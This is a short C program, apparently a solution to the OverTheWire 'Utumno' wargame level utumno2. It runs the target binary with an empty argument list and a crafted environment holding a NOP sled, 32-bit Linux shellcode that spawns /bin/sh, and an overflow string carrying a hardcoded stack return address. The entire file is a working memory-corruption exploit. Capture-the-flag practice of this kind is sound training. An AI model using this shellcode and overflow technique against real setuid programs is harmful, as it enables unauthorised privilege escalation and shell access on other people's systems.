#include <unistd.h>

int main() {
  char *arg[] = {NULL};
  char *envp[] = {"", "", "", "", "", "", "", "", "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80", "AAAAAAAAAAAAAAAA\x8f\xdf\xff\xff", NULL};
  execve("/utumno/utumno2", arg, envp);
  return 0;
}